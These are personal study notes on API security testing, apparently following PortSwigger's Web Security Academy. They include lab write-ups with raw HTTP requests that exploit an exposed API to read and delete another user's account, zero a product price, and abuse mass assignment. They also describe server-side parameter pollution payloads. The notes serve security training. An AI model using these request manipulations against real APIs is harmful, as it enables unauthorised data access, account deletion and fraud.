Link : https://portswigger.net/web-security/learning-paths/api-testing
# API Security


### API Overview
APIs enable software systems and applications to communicate and share data.

### API Recon
- We need to find out as much information about the API as possible to discover the attack surface.
- Identify all the API endpoints where an API receives requests about a specific resource on its server.
- Get to know about how to interact with all the Endpoints.
- Find out information regarding : 
	1. The input data API processes including compulsory and optional parameters.
	2. The type of requests API accepts, including supported HTTP Methods and Media Formats.
	3. Rate Limits and Authentication Mechanisms

### API Documentation
- API Documentation in machine readable format is designed to be processed by software for automating tasks like API integration and validation in the formats like JSON or XML.
- If the application is publicly available, then start your recon by reviewing the documentation.

### Discovering API Documentation
- Even if API doc isn't  available openly, but stull we can access it by using Burp Scanner to crawl the API.
- Browse the Application using Burp's broswer and look for endpoints that may refer to API doc, like
- 
```
/api
/swagger/index.html
/openapi.json
```

- Make sure to investigate the base path of resources found : `/api/swagger/v1/users/123`, then investigate : `/api/swagger/v1 , /api/swagger , /api` 

### Using Machine Readable Documentation
- Using Automated Tools like Burp Scanner to crawl and audit OpenAPI Documentation or any other doc in JSON or YAML format.
- We can also pparse it using OpenAPI Parser BApp.
- We can also use Postman or SoapUI.

### Identifying API Endpoints
- Use Burp Scanner to crawl the application, then manually investigate interesting attack surface using Burp's  browser.
- Look out for URL Structure like `/api/` and for JS Files.
- For better JS File Extraction, we can use JS Link Finder BApp.

### Interacting with API Endpoints
- Check for every API's behavior and discover additional attack surface from it.
- Investigating how API endpoints, review error messages and other responses closely.

### Identifying Supported HTTP Methods
##### HTTP Methods
- `GET` - Retrieves data from a resource.
- `PATCH` - Applies partial changes to a resource.
- `OPTIONS` - Retrieves information on the types of request methods that can be used on a resource.
More examples of methods are  : 
- `GET /api/tasks` - Retrieves a list of tasks.
- `POST /api/tasks` - Creates a new task.
- `DELETE /api/tasks/1` - Deletes a task.

[ ] - You can use the built-in **HTTP verbs** list in Burp Intruder to automatically cycle through a range of methods.

### Identifying Supported Content Types
- APIs behave differently when provided data in an unexpected format.
- On changing content type : 
	- Trigger errors that disclose useful information
	- Bypass flawed defenses
	- Take advantage of differences in the programming and processing logics.  For example, an API may be secure when handling JSON data but susceptible to injection attacks when dealing with XML.
- To change the content type, modify the `Content-Type` header, then reformat the request body

### Using Intruder to Find Hidden Endpoints
If we found any endpoint like `/api/user/update`, then we could create a list of common function like `delete` and `add`, then inject them instead of `/update`.

### Finding Hidden Parameters
- There might be some undocumented parameters that the API supports, that could change the application's behavior when targeted. 
- Burp has numerous tools or extensions for that :
	1. Intruder helps in creating a list of common params and injects them wherever required.
	2. Param Miner BApp enables you to automatically guess names relevant to application, based on info taken from the scope.
	3. Content Discovery tool enables you to discover content that isn't linked from visible content.

### Mass Assignment Vulnerability
- Mass Assignment know as Auto-binding, can create hidden parameters.

### Identifying Hidden Parameters
- As mass assignment creates parameters from object fields, we can indentify them by manually examining the returned objects.
- For example
	`PATCH /api/users/` take up a JSON like `{"username" : "wiener", "email" : "wiener@example.com" }`
	Then a concurrent `GET /api/users/abc123` request returns `{"id": 123, "name" : "John Doe", "email" : "john@example.com" , "isAdmin" : "false"}`

### Testing Mass Assignment Vulnerabilities
To test whether you can modify the enumerated `isAdmin` parameter value, add it the request only like 
```
`{ "username": "wiener", "email": "wiener@example.com", "isAdmin": false }`
```
And check for the behavior and then add inavlid parameter value and then check the difference in behavior like : 
```
{ "username": "wiener", "email": "wiener@example.com", "isAdmin": "foo" }
```
If it behaves differently, this may suggest that the invalid value impacts the query logic, but the valid value doesn't. Hence the user might be able to update the parameter on its own.
And then we can send a request like : 
```
{ "username": "wiener", "email": "wiener@example.com", "isAdmin": true}
```

### Preventing Vulnerabilities in APIs
- Secure the documentation
- Update your docs, so as to update the attacking surface for the legitimate tester.
- Apply an allow-list of HTTP Methods
- Validate the `Content-Type` is expected for each request or response.
- Provide least error information, so as it become non-useful for attacker.
- Use protective measures on all versions of API, not just the current production version.

### Lab: Exploiting an API endpoint using documentation
**Objective :** To delete the account of `carlos` 
- First I checked all the packets involved in Signing In.
- Then I checked the functionality of "Update".
- Then I received a request packet as : 
```
PATCH /api/user/wiener HTTP/2
Host: 0aa20086030260d6827f2086006f004b.web-security-academy.net
Cookie: session=fc0ud45LuPZgyAoVqrtMoI3ZMl2d9rjz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa20086030260d6827f2086006f004b.web-security-academy.net/my-account
Content-Type: text/plain;charset=UTF-8
Content-Length: 33
Origin: https://0aa20086030260d6827f2086006f004b.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"email":"hello@normal-user.net"}
```
-  I then changed this to : 
```
GET /api/user/carlos HTTP/2
Host: 0aa20086030260d6827f2086006f004b.web-security-academy.net
Cookie: session=fc0ud45LuPZgyAoVqrtMoI3ZMl2d9rjz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa20086030260d6827f2086006f004b.web-security-academy.net/my-account
Content-Type: text/plain;charset=UTF-8
Content-Length: 33
Origin: https://0aa20086030260d6827f2086006f004b.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"email":"hello@normal-user.net"}
```
- And I received the response as : 
```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 57

{"username":"carlos","email":"carlos@carlos-montoya.net"}
```
So basically it leaked `carlos` information from the Account of `wiener`.
- Now, I'll try to find the API Documentation using bruteforce approach.
- It was too easy to get the API Documentation, just by going to the route `/api`, it gave me the access to API Doc.
- ![[Screenshot 2025-02-05 155930.png]]
- This image shows that we can directly delete the account by simply constructing the Request as `DELETE /api/user/carlos` and it will delete the user. Let's try it.
- The Request I passed : 
```
DELETE /api/user/carlos HTTP/2
Host: 0aa20086030260d6827f2086006f004b.web-security-academy.net
Cookie: session=fc0ud45LuPZgyAoVqrtMoI3ZMl2d9rjz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aa20086030260d6827f2086006f004b.web-security-academy.net/my-account
Content-Type: text/plain;charset=UTF-8
Content-Length: 0
Origin: https://0aa20086030260d6827f2086006f004b.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
```
- And I received a successful response as : ![[Pasted image 20250205160546.png]]
- Hence the Lab got completed.

### Lab: Finding and exploiting an unused API endpoint
**Objective :** To exploit a hidden API Endpoint to buy a Lightweight I33t Leather Jacket.
- As I know that I first need to find whatever endpoints are present, so I opened ZAP to crawl the webapp.
- Then, I'll login into the account by given credentials.
- I just tried to check every packet coming and found that the last packet was having a `GET /api/product/1/price` header then I tried to make changes with Request Method and foud that only `GET` & `PATCH` were allowed. I then tried to manipulate the package and made several changes and hampered the price making it into `0$` and hence bought the jacket easily.
	![[Screenshot 2025-02-14 164045.png]]


### Lab : Exploiting a Mass Assignment Vulnerability
Objective : 
- Just found out that there was a discount field present, tried to change the field to 100 and got the lab solved.
- ![[Screenshot 2025-02-14 173027.png]]

# Server-Side Parameter Pollution
Some systems contain internal APIs that aren't directly accessible from the internet. Server-side parameter pollution occurs when a website embeds user input in a server-side request to an internal API without adequate encoding. This means that an attacker may be able to manipulate or inject parameters, which may enable them to, for example:

- Override existing parameters.
- Modify the application behavior.
- Access unauthorized data.

You can test any user input for any kind of parameter pollution. For example, query parameters, form fields, headers, and URL path parameters may all be vulnerable.

## Testing for server-side parameter pollution in the query string

To test for server-side parameter pollution in the query string, place query syntax characters like `#`, `&`, and `=` in your input and observe how the application responds.

Consider a vulnerable application that enables you to search for other users based on their username. When you search for a user, your browser makes the following request: `GET /userSearch?name=peter&back=/home`

To retrieve user information, the server queries an internal API with the following request: `GET /users/search?name=peter&publicProfile=true`

## Truncating query strings

You can use a URL-encoded `#` character to attempt to truncate the server-side request. To help you interpret the response, you could also add a string after the `#` character.

For example, you could modify the query string to the following: `GET /userSearch?name=peter%23foo&back=/home`

The front-end will try to access the following URL: `GET /users/search?name=peter#foo&publicProfile=true`

#### Note : 
It's essential that you URL-encode the `#` character. Otherwise the front-end application will interpret it as a fragment identifier and it won't be passed to the internal API.

Review the response for clues about whether the query has been truncated. For example, if the response returns the user `peter`, the server-side query may have been truncated. If an `Invalid name` error message is returned, the application may have treated `foo` as part of the username. This suggests that the server-side request may not have been truncated.

If you're able to truncate the server-side request, this removes the requirement for the `publicProfile` field to be set to true. You may be able to exploit this to return non-public user profiles.

## Injecting invalid parameters

You can use an URL-encoded `&` character to attempt to add a second parameter to the server-side request.

For example, you could modify the query string to the following: `GET /userSearch?name=peter%26foo=xyz&back=/home`

This results in the following server-side request to the internal API: `GET /users/search?name=peter&foo=xyz&publicProfile=true`

Review the response for clues about how the additional parameter is parsed. For example, if the response is unchanged this may indicate that the parameter was successfully injected but ignored by the application.

To build up a more complete picture, you'll need to test further.

## Injecting valid parameters

If you're able to modify the query string, you can then attempt to add a second valid parameter to the server-side request.

For example, if you've identified the `email` parameter, you could add it to the query string as follows:  `GET /userSearch?name=peter%26email=foo&back=/home`

This results in the following server-side request to the internal API: `GET /users/search?name=peter&email=foo&publicProfile=true`

Review the response for clues about how the additional parameter is parsed.

## Overriding existing parameters

To confirm whether the application is vulnerable to server-side parameter pollution, you could try to override the original parameter. Do this by injecting a second parameter with the same name.

For example, you could modify the query string to the following: `GET /userSearch?name=peter%26name=carlos&back=/home`

This results in the following server-side request to the internal API: `GET /users/search?name=peter&name=carlos&publicProfile=true`

The internal API interprets two `name` parameters. The impact of this depends on how the application processes the second parameter. This varies across different web technologies. For example:

- PHP parses the last parameter only. This would result in a user search for `carlos`.
- ASP.NET combines both parameters. This would result in a user search for `peter,carlos`, which might result in an `Invalid username` error message.
- Node.js / express parses the first parameter only. This would result in a user search for `peter`, giving an unchanged result.

If you're able to override the original parameter, you may be able to conduct an exploit. For example, you could add `name=administrator` to the request. This may enable you to log in as the administrator user.

### Lab: Exploiting server-side parameter pollution in a query string
Objective : To solve the lab, log in as the `administrator` and delete `carlos`.


# InsiderPHD - Everything API Hacking

## Finding Your First Bug
Video Link : https://youtu.be/yCUQBc2rY9Y?si=hoQYI9FffIxG_WBV
![[Screenshot 2025-02-25 111243.png]]
![[Screenshot 2025-02-25 111258 1.png]]
![[Screenshot 2025-02-25 111412.png]]
![[Screenshot 2025-02-25 111456.png]]
![[Screenshot 2025-02-25 111535.png]]
![[Screenshot 2025-02-25 111718.png]]
![[Screenshot 2025-02-25 112537.png]]
![[Screenshot 2025-02-25 112631.png]]
![[Screenshot 2025-02-25 112714.png]]
![[Screenshot 2025-02-25 112759.png]]
![[Screenshot 2025-02-25 113034.png]]
![[Screenshot 2025-02-25 113149.png]]
![[Screenshot 2025-02-25 113316.png]]
![[Screenshot 2025-02-25 113441.png]]
![[Screenshot 2025-02-25 113525.png]]
![[Screenshot 2025-02-25 113608.png]]
![[Screenshot 2025-02-25 113746.png]]
![[Screenshot 2025-02-25 113854.png]]

## How to Do Recon : API Enumeration
Video Link : https://youtu.be/fvcKwUS4PTE?si=1QeY9B3KrA_Dxauq
![[Screenshot 2025-02-25 121302.png]]
![[Pasted image 20250225143220.png]]
![[Pasted image 20250225143926.png]]
![[Pasted image 20250225143944.png]]
![[Pasted image 20250225144037.png]]
![[Pasted image 20250225144057.png]]
![[Pasted image 20250225144133.png]]
![[Pasted image 20250225144411.png]]
![[Pasted image 20250225144510.png]]
![[Pasted image 20250225144543.png]]
![[Pasted image 20250225144658.png]]
![[Pasted image 20250225144843.png]]
![[Pasted image 20250225144917.png]]
![[Pasted image 20250225145018.png]]
![[Pasted image 20250225145049.png]]
![[Pasted image 20250225145125.png]]
![[Pasted image 20250225152351.png]]
![[Pasted image 20250225152525.png]]
![[Pasted image 20250225152605.png]]
The command used is : `python arjun.py http://domain.com:8080/api/users --post -o data/result.json -x http://proxyIP:8080`
![[Pasted image 20250225152903.png]]
![[Pasted image 20250225152931.png]]

## Top 10 API Bugs
Video Link : https://youtu.be/aQGbYfalRTA?si=nNWDipSGuNNT7jlM
![[Pasted image 20250225155529.png]]
![[Pasted image 20250225160012.png]]![[Pasted image 20250225160020.png]]
![[Pasted image 20250225160542.png]]
![[Pasted image 20250225160600.png]]
![[Pasted image 20250225160714.png]]
![[Pasted image 20250225160725.png]]
![[Pasted image 20250225160838.png]]
![[Pasted image 20250225160851.png]]
![[Pasted image 20250225160958.png]]
![[Pasted image 20250225161020.png]]
![[Pasted image 20250225161117.png]]
![[Pasted image 20250225161148.png]]
![[Pasted image 20250225161257.png]]![[Pasted image 20250225161242.png]]
![[Pasted image 20250225161415.png]]
![[Pasted image 20250225161427.png]]
![[Pasted image 20250225161459.png]]
![[Pasted image 20250225161511.png]]

## Finding Your First Bug : Manual IDOR Hunting
